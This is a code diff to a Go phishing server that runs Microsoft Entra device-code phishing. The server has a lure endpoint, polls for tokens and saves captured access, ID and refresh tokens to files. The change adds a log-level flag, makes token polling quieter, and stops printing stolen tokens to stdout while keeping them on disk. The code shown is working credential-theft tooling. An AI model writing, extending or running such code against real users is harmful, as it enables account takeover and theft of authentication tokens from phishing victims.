@@ -26,6 +26,7 @@ var (
 	certFile   string
 	keyFile    string
 	lurePath   string
+	logLevel   string
 )
 
 func init() {
@@ -37,6 +38,7 @@ func init() {
 	runCmd.Flags().StringVar(&certFile, "cert", "", "Path to TLS certificate file")
 	runCmd.Flags().StringVar(&keyFile, "key", "", "Path to TLS private key file")
 	runCmd.Flags().StringVarP(&lurePath, "lure-path", "l", "/lure", "Path for the lure endpoint")
+	runCmd.Flags().StringVarP(&logLevel, "log-level", "", "info", "Log level (debug, info, warn, error)")
 }
 
 var runCmd = &cobra.Command{
@@ -44,6 +46,23 @@ var runCmd = &cobra.Command{
 	Short: "Starts the phishing server",
 	Long:  "Starts the phishing server. Listens by default on all interfaces port 443",
 	Run: func(cmd *cobra.Command, args []string) {
+		// Set up logging
+		var level slog.Level
+		switch strings.ToLower(logLevel) {
+		case "debug":
+			level = slog.LevelDebug
+		case "info":
+			level = slog.LevelInfo
+		case "warn":
+			level = slog.LevelWarn
+		case "error":
+			level = slog.LevelError
+		default:
+			level = slog.LevelInfo
+		}
+		logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: level}))
+		slog.SetDefault(logger)
+
 		// Ensure lurePath starts with /
 		if !strings.HasPrefix(lurePath, "/") {
 			lurePath = "/" + lurePath
@@ -132,7 +151,7 @@ func writeTokenToFile(userCode string, tokenType string, token string) error {
 
 func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
 	pollInterval := time.Duration(deviceAuth.Interval) * time.Second
-	slog.Info("Started polling for token: " + deviceAuth.UserCode)
+	slog.Debug("Started polling for token: " + deviceAuth.UserCode)
 
 	for {
 		time.Sleep(pollInterval)
@@ -144,12 +163,7 @@ func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceA
 		}
 
 		if result != nil {
-			// Log to stdout
-			slog.Info("AccessToken for " + deviceAuth.UserCode + ": " + result.AccessToken)
-			slog.Info("IdToken for " + deviceAuth.UserCode + ": " + result.IdToken)
-			slog.Info("RefreshToken for " + deviceAuth.UserCode + ": " + result.RefreshToken)
-
-			// Write to file
+			// Only write tokens to file, no need for stdout logging
 			if err := writeTokenToFile(deviceAuth.UserCode, "AccessToken", result.AccessToken); err != nil {
 				slog.Error("Failed to write access token to file:", err)
 			}
@@ -159,7 +173,9 @@ func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceA
 			if err := writeTokenToFile(deviceAuth.UserCode, "RefreshToken", result.RefreshToken); err != nil {
 				slog.Error("Failed to write refresh token to file:", err)
 			}
+			slog.Info("Successfully captured tokens for " + deviceAuth.UserCode)
 			return
 		}
+		slog.Debug("Checking for token: " + deviceAuth.UserCode)
 	}
 }
